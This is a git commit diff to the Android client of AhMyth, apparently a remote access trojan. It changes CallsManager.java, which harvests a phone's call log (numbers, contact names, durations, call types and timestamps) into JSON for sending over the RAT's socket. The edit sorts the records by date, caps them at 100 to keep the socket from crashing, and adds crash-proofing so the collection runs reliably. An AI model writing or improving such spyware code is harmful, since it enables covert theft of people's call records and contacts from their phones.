31b481ea64d7bfd9b1d08a57958512acde35567b
TestinginKali <kalitestaryan@gmail.com>
2026-02-06 16:31:18 +0530

    latest 100 calls only

--- AhMyth-Client/app/src/main/java/ahmyth/mine/king/ahmyth/CallsManager.java
+++ AhMyth-Client/app/src/main/java/ahmyth/mine/king/ahmyth/CallsManager.java
@@ -9,8 +9,7 @@ import org.json.JSONException;
 import org.json.JSONObject;
 
 /**
- * Created by AhMyth on 11/11/16.
- * Updated for Timestamp Support 2026
+ * Updated for Stability and Timestamp Support 2026
  */
 
 public class CallsManager {
@@ -22,40 +21,41 @@ public class CallsManager {
             JSONArray list = new JSONArray();
 
             Uri allCalls = Uri.parse("content://call_log/calls");
-            Cursor cur = MainService.getContextOfApplication().getContentResolver().query(allCalls, null, null, null, null);
+            
+            // SORT BY DATE DESC: This puts the newest calls first
+            String sortOrder = CallLog.Calls.DATE + " DESC";
+            
+            Cursor cur = MainService.getContextOfApplication().getContentResolver().query(allCalls, null, null, null, sortOrder);
 
             if (cur != null) {
-                while (cur.moveToNext()) {
+                int count = 0;
+                // LIMIT TO 100: Prevents the socket from crashing due to large data size
+                while (cur.moveToNext() && count < 100) {
                     JSONObject call = new JSONObject();
                     
                     String num = cur.getString(cur.getColumnIndex(CallLog.Calls.NUMBER));
                     String name = cur.getString(cur.getColumnIndex(CallLog.Calls.CACHED_NAME));
                     String duration = cur.getString(cur.getColumnIndex(CallLog.Calls.DURATION));
-                    int type = Integer.parseInt(cur.getString(cur.getColumnIndex(CallLog.Calls.TYPE)));
-                    
-                    // NEW: Extract the timestamp (milliseconds since 1970)
+                    int type = cur.getInt(cur.getColumnIndex(CallLog.Calls.TYPE));
                     long date = cur.getLong(cur.getColumnIndex(CallLog.Calls.DATE));
 
-                    call.put("phoneNo", num);
-                    call.put("name", name);
-                    call.put("duration", duration);
+                    call.put("phoneNo", num != null ? num : "Unknown");
+                    call.put("name", name != null ? name : "Unknown");
+                    call.put("duration", duration != null ? duration : "0");
                     call.put("type", type);
-                    
-                    // NEW: Add the date to the JSON object
                     call.put("date", date); 
                     
                     list.put(call);
+                    count++;
                 }
-                cur.close(); // Good practice to close the cursor
+                cur.close(); 
             }
             
             Calls.put("callsList", list);
             return Calls;
-        } catch (JSONException e) {
+        } catch (Exception e) { // Catch all exceptions to prevent app crash
             e.printStackTrace();
         }
         return null;
-
     }
-
 }
